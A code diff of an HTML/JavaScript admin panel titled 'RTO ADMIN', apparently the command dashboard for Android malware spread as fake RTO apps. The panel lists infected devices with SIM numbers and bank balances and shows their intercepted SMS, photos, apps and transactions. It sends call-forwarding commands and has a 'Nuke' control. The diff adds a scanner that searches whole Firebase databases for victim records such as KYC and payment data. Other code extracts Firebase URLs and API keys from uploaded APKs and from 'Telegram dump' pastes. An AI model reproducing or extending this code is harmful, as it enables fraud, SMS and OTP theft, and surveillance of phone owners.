@@ -21,8 +21,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .btn-primary { width:100%; padding:14px; background:#3B82F6; color:white; border:none; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; }
 .btn-secondary { width:100%; padding:12px; background:#1E3A8A; color:#60A5FA; border:1px solid #3B82F6; border-radius:10px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:10px; }
 .error-msg { color:#F87171; font-size:12px; margin-top:8px; min-height:16px; }
-
-/* ACCOUNT LIST */
 .acc-sep { display:flex; align-items:center; gap:10px; margin:22px 0 14px; color:#475569; font-size:10px; text-transform:uppercase; letter-spacing:0.1em; font-weight:bold; }
 .acc-sep::before, .acc-sep::after { content:''; flex:1; height:1px; background:#1E3A8A; }
 .acc-list { text-align:left; max-height:220px; overflow-y:auto; margin-bottom:6px; }
@@ -33,8 +31,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .acc-name { color:#FFF; font-size:12px; font-weight:600; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .acc-url { color:#64748B; font-size:9px; font-family:monospace; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .acc-del { background:rgba(239,68,68,0.15); border:none; color:#F87171; width:26px; height:26px; border-radius:6px; cursor:pointer; font-size:12px; }
-
-/* NEW ACCOUNT FORM */
 .new-form { text-align:left; }
 .new-form h3 { color:#60A5FA; font-size:14px; margin-bottom:14px; text-align:center; }
 .new-form .fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
@@ -44,8 +40,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .btn-row button { flex:1; padding:12px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; }
 .btn-row .save { background:#3B82F6; color:white; }
 .btn-row .cancel { background:#1E3A8A; color:#60A5FA; }
-
-/* NEW CONNECTION ENHANCED */
 .back-btn2 { background:none; border:none; color:#60A5FA; font-size:12px; cursor:pointer; padding:0; margin-bottom:14px; display:flex; align-items:center; gap:4px; text-align:left; }
 .new-acc-full h2 { color:#FFF; font-size:16px; margin-bottom:4px; text-align:left; }
 .new-acc-full .hint2 { color:#64748B; font-size:10px; margin-bottom:16px; text-align:left; }
@@ -65,16 +59,12 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .apk-status.show { display:block; }
 .form-sep2 { display:flex; align-items:center; gap:10px; margin:16px 0 14px; color:#475569; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; font-weight:bold; }
 .form-sep2::before, .form-sep2::after { content:''; flex:1; height:1px; background:#1E3A8A; }
-
-/* TOPBAR */
 .topbar { background:#0A1428; padding:12px 16px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1E3A8A; position:sticky; top:0; z-index:100; }
 .topbar h1 { color:#60A5FA; font-size:14px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:50%; }
 .topbar-right { display:flex; align-items:center; gap:6px; flex-shrink:0; }
 .status { display:flex; align-items:center; gap:5px; font-size:10px; color:#10B981; padding:4px 8px; background:rgba(16,185,129,0.1); border-radius:16px; }
 .dot { width:6px; height:6px; border-radius:50%; background:#10B981; }
 .btn-logout { background:rgba(239,68,68,0.1); color:#F87171; border:1px solid rgba(239,68,68,0.3); padding:6px 12px; border-radius:8px; font-size:10px; font-weight:bold; cursor:pointer; }
-
-/* STATS */
 .stats { display:grid; grid-template-columns:repeat(5,1fr); gap:1px; background:#1E3A8A; border-bottom:1px solid #1E3A8A; }
 .stat { background:#0A1428; padding:10px 6px; text-align:center; }
 .stat .n { font-size:18px; font-weight:bold; color:#60A5FA; }
@@ -82,24 +72,15 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .stat.g .n { color:#10B981; }
 .stat.r .n { color:#F87171; }
 .stat.y .n { color:#F59E0B; }
-
-/* CHIPS */
 .chips { display:flex; gap:6px; padding:10px 16px; overflow-x:auto; background:#0A1428; border-bottom:1px solid #1E3A8A; }
 .chip { padding:7px 12px; background:#050810; border:1px solid #1E3A8A; border-radius:16px; color:#60A5FA; font-size:10px; font-weight:600; cursor:pointer; white-space:nowrap; display:flex; align-items:center; gap:4px; }
-.chip:active { background:#1E3A8A; }
 .chip.danger { color:#F87171; border-color:rgba(239,68,68,0.3); }
-
-/* FILTERS / SEARCH */
 .filters { display:flex; gap:6px; padding:10px 16px; overflow-x:auto; }
 .fbtn { padding:6px 14px; background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; color:#60A5FA; font-size:10px; font-weight:600; cursor:pointer; white-space:nowrap; }
 .fbtn.active { background:#3B82F6; color:white; border-color:#3B82F6; }
 .search-box { margin:0 16px 12px; width:calc(100% - 32px); padding:11px 14px; background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; color:#E5E7EB; font-size:12px; }
-.search-box:focus { outline:none; border-color:#3B82F6; }
-
-/* DEVICE GRID */
 .device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:10px; padding:0 16px 40px; }
 .device-card { background:#0A1428; border:1px solid #1E3A8A; border-radius:12px; padding:12px; cursor:pointer; }
-.device-card:active { border-color:#3B82F6; background:#0F1E3D; }
 .device-header { display:flex; align-items:center; gap:10px; margin-bottom:10px; }
 .wifi-icon { width:38px; height:38px; border-radius:50%; background:linear-gradient(135deg,#1E3A8A,#3B82F6); display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
 .device-info { flex:1; min-width:0; }
@@ -107,13 +88,11 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .device-id { color:#64748B; font-size:9px; font-family:monospace; }
 .device-star { font-size:16px; cursor:pointer; }
 .device-grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:6px; padding-top:10px; border-top:1px solid #1E3A8A; }
-.device-grid-2 .k { color:#475569; font-size:8px; text-transform:uppercase; letter-spacing:0.05em; }
+.device-grid-2 .k { color:#475569; font-size:8px; text-transform:uppercase; }
 .device-grid-2 .v { color:#E5E7EB; font-size:11px; font-weight:500; margin-top:2px; }
 .balance-bar { margin-top:8px; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.3); border-radius:8px; padding:8px 10px; display:flex; justify-content:space-between; align-items:center; font-size:10px; }
 .balance-bar .l { color:#64748B; }
 .balance-bar .a { color:#10B981; font-weight:bold; font-size:13px; }
-
-/* DRAWER */
 .drawer-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.25s; }
 .drawer-overlay.active { opacity:1; pointer-events:auto; }
 .drawer { position:fixed; top:0; right:0; width:100%; max-width:600px; height:100vh; background:#050810; z-index:999; transform:translateX(100%); transition:transform 0.3s; display:flex; flex-direction:column; border-left:1px solid #1E3A8A; }
@@ -130,8 +109,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .tab .cnt { background:#1E3A8A; color:#94A3B8; padding:1px 6px; border-radius:8px; font-size:9px; margin-left:4px; }
 .tab.active .cnt { background:#3B82F6; color:white; }
 .drawer-body { padding:12px; overflow-y:auto; flex:1; }
-
-/* MESSAGES / FORMS */
 .msg { background:#0A1428; border-left:3px solid #3B82F6; border-radius:6px; padding:10px 12px; margin-bottom:6px; }
 .msg.sent { border-left-color:#10B981; }
 .msg-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
@@ -166,8 +143,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .dir { display:flex; justify-content:space-between; padding:9px 0; border-bottom:1px solid #1E3A8A; font-size:11px; }
 .dir .k { color:#64748B; }
 .dir .v { color:#E5E7EB; font-weight:500; text-align:right; max-width:60%; word-break:break-word; }
-
-/* PHOTOS */
 .pgrid { display:grid; grid-template-columns:repeat(auto-fill,minmax(105px,1fr)); gap:6px; }
 .pitem { border-radius:8px; overflow:hidden; background:#0A1428; cursor:pointer; position:relative; border:1px solid #1E3A8A; }
 .pitem img { width:100%; height:105px; object-fit:cover; display:block; background:#1E3A8A; }
@@ -180,8 +155,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .pv-controls button { padding:10px 18px; background:#1E3A8A; border:1px solid #3B82F6; color:#60A5FA; border-radius:8px; cursor:pointer; font-size:11px; font-weight:bold; }
 .pv-controls button.close { background:#EF4444; border-color:#EF4444; color:white; }
 .pv-info { color:#64748B; font-size:10px; margin-top:8px; text-align:center; }
-
-/* APPS / NOTIFS / TX */
 .app { background:#0A1428; padding:9px 11px; border-radius:8px; margin-bottom:5px; display:flex; align-items:center; gap:9px; border-left:2px solid #3B82F6; }
 .app-ic { width:34px; height:34px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); border-radius:9px; display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
 .app-name { color:white; font-size:11px; font-weight:600; }
@@ -222,8 +195,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .sim-btns .sav { background:#10B981; }
 .loading { text-align:center; padding:40px; color:#475569; }
 .empty { text-align:center; padding:40px 20px; color:#475569; font-size:12px; }
-
-/* ═══ CALL FORWARD DIALOG ═══ */
 .cf-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:3000; display:none; align-items:center; justify-content:center; padding:20px; }
 .cf-overlay.active { display:flex; }
 .cf-dialog { background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:400px; width:100%; }
@@ -245,12 +216,16 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .cf-status.err { background:rgba(239,68,68,0.08); border-color:rgba(239,68,68,0.3); color:#F87171; }
 .cf-close { width:100%; padding:11px; background:#1E3A8A; color:#60A5FA; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-top:6px; }
 
+/* SCAN STATUS */
+.scan-status { background:rgba(59,130,246,0.05); border:1px solid rgba(59,130,246,0.2); border-radius:8px; padding:10px; margin:0 16px 12px; font-size:10px; color:#60A5FA; display:flex; align-items:center; gap:8px; }
+.scan-status .spin { display:inline-block; width:12px; height:12px; border:2px solid rgba(59,130,246,0.3); border-top-color:#3B82F6; border-radius:50%; animation:spin 1s linear infinite; }
+@keyframes spin { to { transform:rotate(360deg); } }
+
 @media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .filters, .chips { padding:10px 12px; } .drawer { max-width:100%; } .pitem img { height:90px; } }
 </style>
 </head>
 <body>
 
-<!-- ═══ LOGIN SCREEN ═══ -->
 <div class="login-screen" id="loginScreen">
   <div class="login-box" id="loginBox">
     <h1>🔐 RTO ADMIN</h1>
@@ -260,10 +235,8 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
       <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
       <button class="btn-primary" id="loginBtn">LOGIN WITH PIN</button>
       <div class="error-msg" id="errorMsg"></div>
-      
       <div class="acc-sep">Saved Accounts</div>
       <div class="acc-list" id="accList"></div>
-      
       <button class="btn-secondary" id="btnNewAcc">+ New Account</button>
     </div>
     
@@ -272,14 +245,12 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
         <button class="back-btn2" id="btnCancelNew">← Back</button>
         <h2>🔥 New Firebase Account</h2>
         <div class="hint2">Add Firebase URL, API Key, or upload APK</div>
-        
         <div class="bulk-card">
           <h3>⚡ Bulk Connect</h3>
           <p>Kahi se bhi firebase URLs paste karo — Telegram dump ho, list ho, kuch bhi. Har firebase URL AUTO-detect hoga, saath likhi hui "Auth Key" / 🔑 / Alza... key bhi apne-aap uth jayegi. Duplicate URL sirf ek baar connect hota hai. Bina key ke bhi URL connect hota hai.</p>
           <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy...&#10;&#10;📍 Firebase URL: https://app-two-default-rtdb.firebaseio.com"></textarea>
           <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
         </div>
-        
         <div class="apk-upload" id="apkUpload">
           <div class="up-ico">⬆</div>
           <h4>Upload APK File</h4>
@@ -287,14 +258,11 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
           <div class="apk-status" id="apkStatus"></div>
           <input type="file" id="apkFile" accept=".apk,.zip">
         </div>
-        
         <div class="form-sep2">Or Manual Entry</div>
-        
         <label class="fl">Firebase Database URL</label>
         <input type="text" class="fi" id="newUrl" placeholder="https://your-project.firebaseio.com">
         <label class="fl">Authentication Key / Secret</label>
         <input type="text" class="fi" id="newKey" placeholder="Your Firebase secret key">
-        
         <div class="btn-row">
           <button class="cancel" id="btnCancelNewBottom">Cancel</button>
           <button class="save" id="btnSaveNew">⚡ Save & Connect</button>
@@ -305,7 +273,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   </div>
 </div>
 
-<!-- ═══ MAIN APP ═══ -->
 <div id="mainApp" style="display:none;">
   <div class="topbar">
     <h1 id="topTitle">🚔 RTO ADMIN</h1>
@@ -326,6 +293,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
     <div class="chip" id="btnFb">🔥 FB</div>
     <div class="chip danger" id="btnNuke">☢️ Nuke</div>
   </div>
+  <div class="scan-status" id="scanStatus" style="display:none;"><span class="spin"></span><span id="scanText">Scanning Firebase...</span></div>
   <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search devices...">
   <div class="filters">
     <div class="fbtn active" data-f="all">All</div>
@@ -339,7 +307,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   <div class="device-grid" id="deviceGrid"><div class="loading">Loading...</div></div>
 </div>
 
-<!-- ═══ DRAWER ═══ -->
 <div class="drawer-overlay" id="dOverlay"></div>
 <div class="drawer" id="drawer">
   <div class="drawer-head">
@@ -373,29 +340,23 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   </div>
 </div>
 
-<!-- ═══ CALL FORWARD DIALOG ═══ -->
 <div class="cf-overlay" id="cfOverlay">
   <div class="cf-dialog">
     <h3>📞 Call Forwarding</h3>
     <div class="cf-hint">Enter forwarding number and select SIM. Command will be sent to device via Firebase.</div>
-    
     <label class="cf-label">Forward To Number</label>
     <input type="tel" class="cf-input" id="cfNumber" placeholder="+91XXXXXXXXXX" maxlength="15">
-    
     <label class="cf-label">Select SIM</label>
     <div class="cf-sim-row">
       <div class="cf-sim-btn active" data-cfsim="1">SIM 1</div>
       <div class="cf-sim-btn" data-cfsim="2">SIM 2</div>
     </div>
-    
     <div class="cf-actions">
       <button class="cf-btn activate" id="cfActivate">▶ ACTIVATE</button>
       <button class="cf-btn deactivate" id="cfDeactivate">■ DEACTIVATE</button>
       <button class="cf-btn check" id="cfCheck">🔍 CHECK STATUS</button>
     </div>
-    
     <div class="cf-status" id="cfStatus">Ready. Enter number or click Check Status.</div>
-    
     <button class="cf-close" id="cfClose">✕ CLOSE</button>
   </div>
 </div>
@@ -409,7 +370,6 @@ var RTO_CONFIG = {
   appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
 };
 
-// ═══ STATE ═══
 var db = null;
 var currentApp = null;
 var currentAccount = null;
@@ -422,6 +382,7 @@ var liked = JSON.parse(localStorage.getItem('liked') || '[]');
 var photos = {};
 var curPhoto = '';
 var deviceListener = null;
+var scanListener = null;
 var cfSimSlot = 1;
 
 // ═══ SAVED ACCOUNTS ═══
@@ -508,9 +469,7 @@ function openPanel(config, title) {
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
     startApp();
-  } catch(e) {
-    alert('Connection failed: ' + e.message);
-  }
+  } catch(e) { alert('Connection failed: ' + e.message); }
 }
 function doLogout() {
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
@@ -523,14 +482,93 @@ function doLogout() {
   document.getElementById('newAccView').style.display = 'none';
   renderAccounts();
 }
+
+// ═══════════════════════════════════════════════════════
+// ⭐ UNIVERSAL DEVICE SCANNER ⭐
+// Firebase mein kahin bhi device ho — dhundh lega
+// ═══════════════════════════════════════════════════════
 function startApp() {
+  // Purane listeners hatao
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
-  deviceListener = db.ref('device_info');
-  deviceListener.on('value', function(s) {
-    devs = s.val() || {};
-    updStats(); renderDevs();
+  if (scanListener) { try { scanListener.off(); } catch(e) {} }
+  
+  var scanEl = document.getElementById('scanStatus');
+  var scanText = document.getElementById('scanText');
+  scanEl.style.display = 'flex';
+  scanText.textContent = 'Scanning Firebase for devices...';
+  
+  devs = {};
+  
+  // ✅ Poora Firebase root scan karo
+  scanListener = db.ref('/');
+  scanListener.on('value', function(snapshot) {
+    var root = snapshot.val() || {};
+    devs = {};
+    var found = 0;
+    
+    // ✅ Har top-level node scan karo
+    Object.keys(root).forEach(function(nodeName) {
+      var node = root[nodeName];
+      if (!node || typeof node !== 'object') return;
+      
+      // Skip known non-device nodes
+      var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
+      if (skipNodes.indexOf(nodeName) !== -1) return;
+      
+      // ✅ Har entry check karo (DEV_XXX ya koi bhi)
+      Object.keys(node).forEach(function(key) {
+        var entry = node[key];
+        if (!entry || typeof entry !== 'object') return;
+        
+        // ✅ Device hai ya nahi? Heuristic check
+        if (isDeviceEntry(key, entry)) {
+          // Agar same device multiple nodes mein hai, merge karo
+          if (devs[key]) {
+            devs[key] = Object.assign({}, devs[key], entry);
+          } else {
+            devs[key] = entry;
+            found++;
+          }
+        }
+      });
+    });
+    
+    console.log('Devices found:', found, devs);
+    scanText.textContent = 'Found ' + found + ' device(s)';
+    setTimeout(function() {
+      scanEl.style.display = 'none';
+    }, 1500);
+    
+    updStats();
+    renderDevs();
     if (curId && devs[curId]) renderTab();
+  }, function(error) {
+    console.error('Scan error:', error);
+    scanText.textContent = '❌ Error: ' + error.message;
   });
+}
+
+// ✅ Device entry detect karo — multiple signals
+function isDeviceEntry(key, entry) {
+  // ✅ DEV_ prefix wali key = definitely device
+  if (key.indexOf('DEV_') === 0) return true;
+  
+  // ✅ Known device fields check karo
+  var deviceFields = [
+    'device_model', 'device_id', 'device_manufacturer', 'device_brand',
+    'android_version', 'android_sdk', 'sim_info', 'battery',
+    'first_install_timestamp', 'install_timestamp', 'device_hardware',
+    'device_fingerprint', 'status', 'last_seen', 'messages',
+    'form_data', 'kyc_data', 'payment_data'
+  ];
+  
+  var matches = 0;
+  for (var i = 0; i < deviceFields.length; i++) {
+    if (entry[deviceFields[i]] !== undefined) matches++;
+  }
+  
+  // ✅ 2+ device fields match hue toh device hai
+  return matches >= 2;
 }
 
 // ═══ NEW ACCOUNT ═══
@@ -547,7 +585,6 @@ function hideNewAcc() {
   document.getElementById('pinView').style.display = 'block';
   document.getElementById('newAccView').style.display = 'none';
 }
-
 function parseBulkInput(text) {
   var accounts = [];
   var seenUrls = {};
@@ -593,98 +630,43 @@ function handleApkUpload(file) {
   var status = document.getElementById('apkStatus');
   status.classList.add('show');
   status.textContent = '⏳ Reading APK (' + (file.size / 1024 / 1024).toFixed(1) + ' MB)...';
-  
   var reader = new FileReader();
   reader.onload = function(e) {
     try {
       JSZip.loadAsync(e.target.result).then(function(zip) {
         status.textContent = '📦 APK opened. Scanning all files...';
-        
-        var foundUrls = [];
-        var foundKeys = [];
-        var scanned = 0;
-        var total = 0;
-        
+        var foundUrls = [], foundKeys = [], scanned = 0, total = 0;
         var files = [];
-        zip.forEach(function(path, file) {
-          if (file.dir) return;
-          files.push({path: path, file: file});
-          total++;
-        });
-        
+        zip.forEach(function(path, file) { if (!file.dir) { files.push({path:path, file:file}); total++; } });
         status.textContent = '📦 Found ' + total + ' files. Scanning...';
-        
         var promises = files.map(function(item) {
           return item.file.async('uint8array').then(function(bytes) {
             scanned++;
-            
-            // UTF-8
-            var utf8 = bytesToUtf8(bytes);
-            scanText(utf8);
-            
-            // UTF-16 LE + BE for binary files
+            scanText(bytesToUtf8(bytes));
             if (item.path.indexOf('.arsc') !== -1 || item.path.indexOf('.xml') !== -1 || item.path.indexOf('.dex') !== -1) {
               scanText(bytesToUtf16(bytes, true));
               scanText(bytesToUtf16(bytes, false));
             }
-            
-            // DEX string pool
-            if (item.path.indexOf('.dex') !== -1) {
-              scanText(extractDexStrings(bytes));
-            }
-            
-            if (scanned % 10 === 0) {
-              status.textContent = '🔍 Scanned ' + scanned + '/' + total + ' files...';
-            }
+            if (item.path.indexOf('.dex') !== -1) scanText(extractDexStrings(bytes));
+            if (scanned % 10 === 0) status.textContent = '🔍 Scanned ' + scanned + '/' + total + ' files...';
           }).catch(function() { scanned++; });
         });
-        
         Promise.all(promises).then(function() {
-          var uniqueUrls = dedup(foundUrls);
-          var uniqueKeys = dedup(foundKeys);
-          console.log('Found URLs:', uniqueUrls);
-          console.log('Found Keys:', uniqueKeys);
-          
-          if (uniqueUrls.length > 0) {
-            var bestUrl = uniqueUrls[0];
-            for (var i = 0; i < uniqueUrls.length; i++) {
-              if (uniqueUrls[i].indexOf('firebaseio.com') !== -1 || uniqueUrls[i].indexOf('firebasedatabase.app') !== -1) {
-                bestUrl = uniqueUrls[i]; break;
-              }
-            }
+          var uUrls = dedup(foundUrls), uKeys = dedup(foundKeys);
+          console.log('Found URLs:', uUrls);
+          console.log('Found Keys:', uKeys);
+          if (uUrls.length > 0) {
+            var bestUrl = uUrls[0];
+            for (var i = 0; i < uUrls.length; i++) { if (uUrls[i].indexOf('firebaseio.com') !== -1 || uUrls[i].indexOf('firebasedatabase.app') !== -1) { bestUrl = uUrls[i]; break; } }
             document.getElementById('newUrl').value = bestUrl;
-            status.textContent = '✅ Found ' + uniqueUrls.length + ' URL(s): ' + bestUrl.substring(0, 50) + '...';
-          } else {
-            status.textContent = '⚠️ No Firebase URL found in this APK';
-          }
-          if (uniqueKeys.length > 0) {
-            document.getElementById('newKey').value = uniqueKeys[0];
-          }
+            status.textContent = '✅ Found ' + uUrls.length + ' URL(s): ' + bestUrl.substring(0, 50) + '...';
+          } else status.textContent = '⚠️ No Firebase URL found in this APK';
+          if (uKeys.length > 0) document.getElementById('newKey').value = uKeys[0];
         });
-        
-        function dedup(arr) {
-          var out = [], seen = {};
-          arr.forEach(function(x) { if (!seen[x]) { seen[x] = true; out.push(x); } });
-          return out;
-        }
-        function bytesToUtf8(bytes) {
-          try { return new TextDecoder('utf-8', {fatal: false}).decode(bytes); }
-          catch(e) { var s=''; for (var i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]); return s; }
-        }
-        function bytesToUtf16(bytes, le) {
-          try { return new TextDecoder(le?'utf-16le':'utf-16be', {fatal:false}).decode(bytes); }
-          catch(e) { return ''; }
-        }
-        function extractDexStrings(bytes) {
-          var result = '', current = '';
-          for (var i = 0; i < bytes.length; i++) {
-            var b = bytes[i];
-            if (b >= 32 && b <= 126) current += String.fromCharCode(b);
-            else { if (current.length >= 4) result += current + '\n'; current = ''; }
-          }
-          if (current.length >= 4) result += current + '\n';
-          return result;
-        }
+        function dedup(arr) { var out = [], seen = {}; arr.forEach(function(x) { if (!seen[x]) { seen[x] = true; out.push(x); } }); return out; }
+        function bytesToUtf8(bytes) { try { return new TextDecoder('utf-8', {fatal:false}).decode(bytes); } catch(e) { var s=''; for (var i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]); return s; } }
+        function bytesToUtf16(bytes, le) { try { return new TextDecoder(le?'utf-16le':'utf-16be', {fatal:false}).decode(bytes); } catch(e) { return ''; } }
+        function extractDexStrings(bytes) { var r='',c=''; for (var i=0;i<bytes.length;i++){var b=bytes[i]; if(b>=32&&b<=126)c+=String.fromCharCode(b); else{if(c.length>=4)r+=c+'\n';c='';}} if(c.length>=4)r+=c+'\n'; return r; }
         function scanText(text) {
           if (!text) return;
           var patterns = [
@@ -696,57 +678,32 @@ function handleApkUpload(file) {
             /[a-zA-Z0-9-]+\.firebaseio\.com/g,
             /[a-zA-Z0-9-]+-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app/g
           ];
-          patterns.forEach(function(p) {
-            var m = text.match(p);
-            if (m) m.forEach(function(url) {
-              if (url.indexOf('http') !== 0) url = 'https://' + url;
-              if (url.indexOf('example.com') !== -1) return;
-              if (url.length > 200) return;
-              foundUrls.push(url);
-            });
-          });
+          patterns.forEach(function(p) { var m = text.match(p); if (m) m.forEach(function(url) { if (url.indexOf('http') !== 0) url = 'https://' + url; if (url.indexOf('example.com') !== -1) return; if (url.length > 200) return; foundUrls.push(url); }); });
           var km = text.match(/AIzaSy[A-Za-z0-9_-]{33}/g);
           if (km) km.forEach(function(k) { foundKeys.push(k); });
         }
-      }).catch(function(err) {
-        status.textContent = '❌ Error: ' + err.message;
-      });
+      }).catch(function(err) { status.textContent = '❌ Error: ' + err.message; });
     } catch(err) { status.textContent = '❌ Error: ' + err.message; }
   };
   reader.readAsArrayBuffer(file);
 }
 
-// ═══ SAVE & CONNECT ═══
 function saveNewAcc() {
   var url = document.getElementById('newUrl').value.trim();
   var key = document.getElementById('newKey').value.trim();
   var err = document.getElementById('newErr');
-  
-  if (!url || url.indexOf('firebaseio') === -1) {
-    err.textContent = '❌ Invalid Firebase URL';
-    return;
-  }
+  if (!url || url.indexOf('firebaseio') === -1) { err.textContent = '❌ Invalid Firebase URL'; return; }
   if (!key) key = RTO_CONFIG.apiKey;
-  
   err.textContent = 'Testing connection...';
-  var testCfg = {
-    apiKey: key, databaseURL: url,
-    projectId: url.replace('https://','').replace('.firebaseio.com','')
-  };
-  
+  var testCfg = { apiKey: key, databaseURL: url, projectId: url.replace('https://','').replace('.firebaseio.com','') };
   var list = getSavedAccounts();
   var dup = list.findIndex(function(a) { return a.url === url; });
   var acc = { name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb',''), url: url, apiKey: key };
   if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; }
   else list.push(acc);
   saveAccounts(list);
-  
   err.textContent = '✅ Connected! Opening panel...';
-  setTimeout(function() {
-    currentAccount = acc;
-    hideNewAcc();
-    openPanel(testCfg, acc.name);
-  }, 600);
+  setTimeout(function() { currentAccount = acc; hideNewAcc(); openPanel(testCfg, acc.name); }, 600);
 }
 
 // ═══ STATS / DEVICES ═══
@@ -798,7 +755,7 @@ function renderDevs() {
   });
   g.innerHTML = ids.map(function(id) {
     var d = devs[id];
-    var m = d.device_model || 'Unknown';
+    var m = d.device_model || d.device_name || 'Unknown';
     var b = d.battery || '0%';
     var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || 'No SIM';
     var bal = d.last_balance || '';
@@ -843,7 +800,7 @@ function extractTx(body) {
   return m && m.length > 1 ? m[m.length - 1] : (m && m[0] ? m[0] : '');
 }
 function detectFromSms(allMsgs) {
-  var phones = {}; var nets = {};
+  var phones = {}, nets = {};
   allMsgs.forEach(function(m) {
     var t = (m.body || '') + ' ' + (m.sender || '');
     var pm = t.match(/\b[6-9]\d{9}\b/g);
@@ -858,7 +815,7 @@ function detectFromSms(allMsgs) {
 function openDev(id) {
   curId = id;
   var d = devs[id];
-  document.getElementById('dTitle').textContent = '📱 ' + (d.device_model || id);
+  document.getElementById('dTitle').textContent = '📱 ' + (d.device_model || d.device_name || id);
   updStar();
   db.ref('device_info/' + id + '/messages').on('value', function(s) {
     curMsgs = s.val() || {};
@@ -884,7 +841,6 @@ function switchTab(t) {
   document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); });
   renderTab();
 }
-
 function renderTab() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -940,7 +896,6 @@ function renderTab() {
   } else if (curTab === 'send') {
     if (b.getAttribute('data-rendered') === 'send') return;
     b.setAttribute('data-rendered', 'send');
-    
     var f = d.forward_settings || {};
     var simSel = f.forward_sim_slot || 1;
     var fOn = f.enabled || false;
@@ -965,37 +920,25 @@ function renderTab() {
   }
 }
 
-// ═══ PHOTOS ═══
 function renderPhotos() {
   var b = document.getElementById('dBody');
   var arr = Object.entries(photos);
   arr = arr.filter(function(p) { return p[1] && (p[1].url || p[1].base64); });
   var seen = {};
-  arr = arr.filter(function(p) {
-    var key = p[1].name || p[0];
-    if (seen[key]) return false;
-    seen[key] = true;
-    return true;
-  });
+  arr = arr.filter(function(p) { var key = p[1].name || p[0]; if (seen[key]) return false; seen[key] = true; return true; });
   document.getElementById('cPhotos').textContent = arr.length;
   if (arr.length === 0) { b.innerHTML = '<div class="empty">No photos yet</div>'; return; }
   b.innerHTML = '<div class="pgrid">' + arr.map(function(p) {
-    var url = p[1].url || '';
-    var base64 = p[1].base64 || '';
-    var imgSrc = '';
-    if (url) { imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/'); }
-    else if (base64) { imgSrc = base64; }
+    var url = p[1].url || '', base64 = p[1].base64 || '', imgSrc = '';
+    if (url) imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
+    else if (base64) imgSrc = base64;
     return '<div class="pitem" data-p="' + p[0] + '"><img src="' + imgSrc + '" loading="lazy">' + (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') + '<div class="pname">' + esc(p[1].name || 'IMG') + '</div></div>';
   }).join('') + '</div>';
-  b.querySelectorAll('[data-p]').forEach(function(e) {
-    e.addEventListener('click', function() { showP(this.getAttribute('data-p')); });
-  });
